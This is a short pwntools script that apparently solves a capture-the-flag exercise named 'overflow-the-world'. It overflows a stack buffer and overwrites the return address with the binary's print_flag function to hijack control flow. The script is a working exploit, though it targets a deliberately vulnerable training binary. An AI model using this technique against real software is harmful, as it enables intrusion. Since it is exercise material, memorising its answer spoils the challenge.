#!/usr/bin/env python3
from pwn import *

exe = ELF("./overflow-the-world")

r = process([exe.path])

win = exe.symbols["print_flag"]
#write your payload here, prompt: it should be overwrite the saved base pointer (rbp), positioning the payload right at the saved return address, then add p64(win).
# payload = 
payload = b'0' * 64  # Fill the buffer
payload += b'0' * 8  # Overwrite saved RBP
payload += p64(win)  # Overwrite return address with print_flag address

r.recvuntil(b"What's your name? ")
r.sendline(payload)

r.recvuntil(b"Let's play a game.\n")
r.interactive()